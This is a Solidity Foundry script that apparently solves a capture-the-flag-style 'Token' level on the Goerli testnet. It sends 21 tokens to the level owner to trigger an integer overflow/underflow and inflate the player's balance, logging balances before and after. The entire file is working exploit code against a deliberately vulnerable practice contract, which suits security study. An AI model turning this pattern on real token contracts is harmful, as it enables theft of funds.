// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Token.sol";

// run this on goerli
contract TokenAttackScript is Script {

    function run() external {

        uint256 attackerPrivateKey = vm.envUint("DEV_PRIVATE_KEY");

        address instance = 0xC4a4764a697546e5c0338bBe87FD8f0c8f493f8C;
        address level = 0xB4802b28895ec64406e45dB504149bfE79A38A57;
        address player = 0xFb4a42f442E53C95Bb30Dc6505E7f39bb121EbF2;

        vm.startBroadcast(attackerPrivateKey);

        Token token = Token(instance);

        console.log("attacker balance before attack: %d", token.balanceOf(player));
        console.log("owner balance before attack: %d", token.balanceOf(level));

        // transfer 21 to owner, triggering integer overflow
        token.transfer(level, 21);

        console.log("attacker balance after attack: %d", token.balanceOf(player));
        console.log("owner balance after attack: %d", token.balanceOf(level));

        vm.stopBroadcast();

    }

}
